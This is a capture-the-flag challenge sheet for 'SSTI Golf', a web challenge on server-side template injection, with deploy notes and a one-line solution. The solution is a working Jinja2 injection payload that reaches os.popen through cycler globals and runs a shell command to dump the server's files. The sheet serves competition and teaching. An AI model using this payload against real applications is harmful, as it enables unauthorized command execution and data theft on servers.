# SSTI Golf
**Category:** Web
**Difficulty:** Easy-Medium
**Author:** puzzler7

## Description

Just in case you didn't get *enough* golf with the other challenge.

## Distribution

- website

## Deploy notes

- needs hd on the remote (which I think is standard?) - otherwise I'll need to increase the limit to 50 and the solution will use cat.

## Solution

- `{{cycler.next.__globals__.os.popen('hd *')|min}}`
